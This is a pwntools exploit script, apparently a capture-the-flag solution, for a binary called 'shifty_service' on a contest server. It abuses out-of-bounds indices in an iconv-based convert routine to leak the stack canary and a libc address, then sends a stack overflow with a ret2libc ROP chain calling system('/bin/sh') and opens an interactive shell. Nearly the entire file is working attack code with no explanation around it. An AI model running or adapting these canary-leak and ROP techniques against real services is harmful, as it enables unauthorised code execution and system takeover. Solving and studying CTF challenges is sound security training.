#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 8002
HOST = "chal1.fwectf.com"
exe = context.binary = ELF('./shifty_service_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040136F
            b* 0x4013c0
            b* 0x0000000000401463
            # iconv_open
            b* 0x0000000000401524
            # iconv
            b* 0x000000000040165D
            b* 0x00000000004016E6
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, data):
    p.sendlineafter(b'> ', str(1))
    p.sendlineafter(b'> ', str(idx))
    p.sendafter(b'> ', data)

def show(idx):
    p.sendlineafter(b'> ', str(2))
    p.sendlineafter(b'> ', str(idx))

def convert(src_idx, dest_idx, fromcode, tocode):
    p.sendlineafter(b'> ', str(3))
    p.sendlineafter(b'> ', str(src_idx))
    p.sendlineafter(b'> ', str(dest_idx))
    p.sendlineafter(b'> ', fromcode)
    p.sendlineafter(b'> ', tocode)

# VARIABLE


# PAYLOAD
# add(1, b'a'*8 + b'a'*16)
# add(2, b'b'*0x100)

convert(3, 0, b'ISO-8859-1', b'ISO-8859-1')
add(0, b'b'*0x51)
show(0)
p.recvuntil(b'b'*0x51)
canary = u64(b'\0' + p.recv(7))
log.info("Canary: " + hex(canary))

convert(-3, 1, b'ISO-8859-1', b'ISO-8859-1')
add(1, b'a'*8)
show(1)
p.recvuntil(b'a'*8)
libc_leak = u64(p.recv(6) + b'\0'*2)
libc.address = libc_leak - libc.sym._IO_2_1_stdout_
log.info("Libc base: " + hex(libc.address))

pop_rdi = 0x000000000010f75b + libc.address
ret = 0x000000000002882f + libc.address
payload = flat(
    b'a'*0x50,
    canary,
    b'a'*8,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    ret,
    libc.sym.system
    )
add(2, payload)
convert(2, 3, b'ISO-8859-1', b'ISO-8859-1')
p.sendlineafter(b'> ', str(4))

p.interactive()

# -2: canary
# -7: libc